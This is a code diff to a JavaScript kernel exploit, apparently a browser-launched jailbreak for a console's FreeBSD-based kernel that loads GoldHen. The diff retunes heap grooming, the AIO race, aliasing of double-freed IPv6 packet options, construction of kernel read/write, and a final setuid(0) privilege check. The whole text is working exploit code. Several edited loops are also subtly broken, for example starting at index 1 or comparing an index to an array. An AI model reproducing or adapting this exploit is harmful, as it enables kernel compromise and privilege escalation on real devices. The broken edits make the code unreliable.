@@ -185,8 +185,8 @@ const AF_INET6 = 28;
 const SOCK_STREAM = 1;
 const SOCK_DGRAM = 2;
 const SOL_SOCKET = 0xffff;
-const SO_REUSEADDR = 4;
-const SO_LINGER = 0x80;
+const SO_REUSEADDR = 0x0004;
+const SO_LINGER = 0x0080;
 
 // netinet/in.h
 const IPPROTO_TCP = 6;
@@ -194,8 +194,8 @@ const IPPROTO_UDP = 17;
 const IPPROTO_IPV6 = 41;
 
 // netinet/tcp.h
-const TCP_INFO = 0x20;
-const size_tcp_info = 0xec;
+const TCP_INFO = 32;
+const sizeof_tcp_info_ = 0xec;
 
 // netinet/tcp_fsm.h
 const TCPS_ESTABLISHED = 4;
@@ -210,12 +210,19 @@ const IPV6_TCLASS = 61;
 // sys/cpuset.h
 const CPU_LEVEL_WHICH = 3;
 const CPU_WHICH_TID = 1;
+const sizeof_cpuset_t_ = 0x10;
 
 // sys/mman.h
-const MAP_SHARED = 1;
-const MAP_FIXED = 0x10;
+const PROT_READ = 0x01;
+const PROT_WRITE = 0x02;
+const PROT_EXEC = 0x04;
+const MAP_SHARED = 0x0001;
+const MAP_FIXED = 0x0010;
+const MAP_ANON = 0x1000;
+const MAP_PREFAULT_READ = 0x00040000;
 
 // sys/rtprio.h
+const RTP_LOOKUP = 0;
 const RTP_SET = 1;
 const RTP_PRIO_REALTIME = 2;
 
@@ -246,13 +253,15 @@ const rtprio = View2.of(RTP_PRIO_REALTIME, 0x100);
 
 // CONFIG CONSTANTS
 const main_core = 7;
+const main_rtprio = 0x100;
 const num_grooms = 0x200;
 const num_handles = 0x100;
-const num_sds = 0x100; // max is 0x100 due to max IPV6_TCLASS
+const num_sds = 64;
+const num_sds_alt = 48;
 const num_alias = 100;
 const num_races = 100;
 const leak_len = 16;
-const num_leaks = 5;
+const num_leaks = 16;
 const num_clobbers = 8;
 
 let chain = null;
@@ -322,8 +331,8 @@ function call_nze(...args) {
 //     u_int prio,
 //     SceKernelAioSubmitId ids[]
 // );
-function aio_submit_cmd(cmd, requests, num_requests, handles) {
-    sysi('aio_submit_cmd', cmd, requests, num_requests, 3, handles);
+function aio_submit_cmd(cmd, requests, num_requests, ids) {//handles
+    sysi('aio_submit_cmd', cmd, requests, num_requests, 3, ids);
 }
 
 // the various SceAIO syscalls that copies out errors/states will not check if
@@ -454,26 +463,50 @@ function free_aios2(ids_p, num_ids) {
     }
 }
 
-function get_our_affinity(mask) {
-    sysi(
-        'cpuset_getaffinity',
-        CPU_LEVEL_WHICH,
-        CPU_WHICH_TID,
-        -1,
-        8,
-        mask.addr,
-    );
+function get_cpu_affinity(mask) {
+  sysi("cpuset_getaffinity", CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, sizeof_cpuset_t_, mask.addr);
 }
 
-function set_our_affinity(mask) {
-    sysi(
-        'cpuset_setaffinity',
-        CPU_LEVEL_WHICH,
-        CPU_WHICH_TID,
-        -1,
-        8,
-        mask.addr,
-    );
+function set_cpu_affinity(mask) {
+  sysi("cpuset_setaffinity", CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, sizeof_cpuset_t_, mask.addr);
+}
+
+function pin_to_core(core) {
+  const mask = new Buffer(sizeof_cpuset_t_);
+  mask.write32(0, 1 << core);
+  set_cpu_affinity(mask);
+}
+
+function get_core_index(mask) {
+  let num = mem.read32(mask.addr);
+  let position = 0;
+  while (num > 0) {
+    num = num >>> 1;
+    position += 1;
+  }
+  return position - 1;
+}
+
+function get_current_core() {
+  const mask = new Buffer(sizeof_cpuset_t_);
+  get_cpu_affinity(mask);
+  return get_core_index(mask);
+}
+
+function get_current_rtprio() {
+  const _rtprio = new Buffer(4);
+  sysi("rtprio_thread", RTP_LOOKUP, 0, _rtprio.addr);
+  return {
+    type: _rtprio.read16(0),
+    prio: _rtprio.read16(2),
+  };
+}
+
+function set_rtprio(rtprio_obj) {
+  const _rtprio = new Buffer(4);
+  _rtprio.write16(0, rtprio_obj.type);
+  _rtprio.write16(2, rtprio_obj.prio);
+  sysi("rtprio_thread", RTP_SET, 0, _rtprio.addr);
 }
 
 function close(fd) {
@@ -711,12 +744,12 @@ function race_one(request_addr, tcp_sd, barrier, racer, sds) {
         aio_multi_poll(request_addr, 1, poll_err.addr);
         log(`poll: ${hex(poll_err[0])}`);
 
-        const info_buf = new View1(size_tcp_info);
+        const info_buf = new View1(sizeof_tcp_info_);
         const info_size = gsockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, info_buf);
         log(`info size: ${hex(info_size)}`);
 
-        if (info_size !== size_tcp_info) {
-            die(`info size isn't ${size_tcp_info}: ${info_size}`);
+        if (info_size !== sizeof_tcp_info_) {
+            die(`info size isn't ${sizeof_tcp_info_}: ${info_size}`);
         }
 
         const tcp_state = info_buf[0];
@@ -1062,17 +1095,17 @@ function leak_kernel_addrs(sd_pair) {
 
 function make_aliased_pktopts(sds) {
     const tclass = new Word();
-    for (let loop = 0; loop < num_alias; loop++) {
-        for (let i = 0; i < num_sds; i++) {
+    for (let loop = 1; loop < num_alias; loop++) {
+        for (let i = 1; i < sds.length; i++) {
             setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
         }
 
-        for (let i = 0; i < num_sds; i++) {
+        for (let i = 1; i < sds.length; i++) {
             tclass[0] = i;
             ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
         }
 
-        for (let i = 0; i < sds.length; i++) {
+        for (let i = 1; i < sds.length; i++) {
             gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
             const marker = tclass[0];
             if (marker !== i) {
@@ -1083,7 +1116,7 @@ function make_aliased_pktopts(sds) {
                 sds.splice(i, 1);
                 // add pktopts to the new sockets now while new allocs can't
                 // use the double freed memory
-                for (let i = 0; i < 2; i++) {
+                for (let i = 1; i < 2; i++) {
                     const sd = new_socket();
                     ssockopt(sd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
                     sds.push(sd);
@@ -1093,7 +1126,6 @@ function make_aliased_pktopts(sds) {
             }
         }
     }
-    localStorage.failcount = ++localStorage.failcount;window.failCounter.innerHTML=localStorage.failcount;
     die('failed to make aliased pktopts');
 }
 
@@ -1287,7 +1319,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     let reclaim_sd = null;
     close(pktopts_sds[1]);
     for (let i = 0; i < num_alias; i++) {
-        for (let i = 0; i < num_sds; i++) {
+        for (let i = 0; i < num_sds_alt; i++) {
             // if a socket doesn't have a pktopts, setting the rthdr will make
             // one. the new pktopts might reuse the memory instead of the
             // rthdr. make sure the sockets already have a pktopts before
@@ -1771,23 +1803,31 @@ export async function kexploit() {
     }
     catch (e) {}
 
+    // Get current core/rtprio
+    const current_core = get_current_core();
+    const current_rtprio = get_current_rtprio();
+    log(`current core: ${current_core}`);
+    log(`current rtprio: type=${current_rtprio.type} prio=${current_rtprio.prio}`);
+
     // fun fact:
     // if the first thing you do since boot is run the web browser, WebKit can
     // use all the cores
     const main_mask = new Long();
-    get_our_affinity(main_mask);
+    get_cpu_affinity(main_mask);
     log(`main_mask: ${main_mask}`);
 
     // pin to 1 core so that we only use 1 per-cpu bucket. this will make heap
     // spraying and grooming easier
     log(`pinning process to core #${main_core}`);
-    set_our_affinity(new Long(1 << main_core));
-    get_our_affinity(main_mask);
+    //set_cpu_affinity(new Long(1 << main_core));
+    pin_to_core(main_core);
+    get_cpu_affinity(main_mask);
     log(`main_mask: ${main_mask}`);
 
     log("setting main thread's priority");
-    sysi('rtprio_thread', RTP_SET, 0, rtprio.addr);
-
+    //sysi('rtprio_thread', RTP_SET, 0, rtprio.addr);
+    set_rtprio({ type: RTP_PRIO_REALTIME, prio: 0x100 });
+    //set_rtprio(main_rtprio);
     const [block_fd, unblock_fd] = (() => {
         const unix_pair = new View4(2);
         sysi('socketpair', AF_UNIX, SOCK_STREAM, 0, unix_pair.addr);
@@ -1795,8 +1835,14 @@ export async function kexploit() {
     })();
 
     const sds = [];
+    const sds_alt = [];
+    
     for (let i = 0; i < num_sds; i++) {
         sds.push(new_socket());
+    }
+
+    for (let i = 0; i < num_sds_alt; i++) {
+        sds_alt.push(new_socket());
     }
 
     let block_id = null;
@@ -1827,9 +1873,10 @@ export async function kexploit() {
              
         log('load GoldHen succeeded!');
         Exploit_done();
-    } finally {
-        close(unblock_fd);
-
+    } finally {      
+        if (unblock_fd !== undefined && unblock_fd !== null) {
+          close(unblock_fd);
+        }
         const t2 = performance.now();
         const ftime = t2 - t1;
         const init_time = _init_t2 - _init_t1;
@@ -1838,14 +1885,34 @@ export async function kexploit() {
         log('init time: ' + (init_time) / 1000);
         log('time to init: ' + (_init_t1 - t1) / 1000);
         log('time - init time: ' + (ftime - init_time) / 1000);
+       }
+       if (block_fd !== undefined && block_fd !== null) {
+         close(block_fd);
+       }
+       if (groom_ids) {
+         free_aios2(groom_ids.addr, groom_ids.length);
+       }
+       if (block_id !== null) {
+         aio_multi_wait(block_id.addr, 1);
+         aio_multi_delete(block_id.addr, block_id.length);
     }
-    close(block_fd);
-    free_aios2(groom_ids.addr, groom_ids.length);
-    aio_multi_wait(block_id.addr, 1);
-    aio_multi_delete(block_id.addr, block_id.length);
-    for (const sd of sds) {
+    /*for (const sd of sds) {
         close(sd);
+    }*/
+
+    for (let i = 1; i < sds; i++) {
+        close(sds[i]);
     }
+
+    for (let i = 1; i < sds_alt; i++) {
+        close(sds_alt[i]);
+    }
+        
+   log(`restoring core: ${current_core}`);
+   log(`restoring rtprio: type=${current_rtprio.type} prio=${current_rtprio.prio}`);
+   pin_to_core(current_core);
+   set_rtprio(current_rtprio);
+    
   // Check if it all worked
   try {
     if (sysi("setuid", 0) == 0) {
@@ -1858,10 +1925,4 @@ export async function kexploit() {
   return false;    
     
 }
-setTimeout(kexploit, 1000);  
-/*kexploit().then((success) => {
-  if (success) { 
-        log('load GoldHen succeeded!');
-        Exploit_done();
-  }
-});*/
+setTimeout(kexploit, 1000);
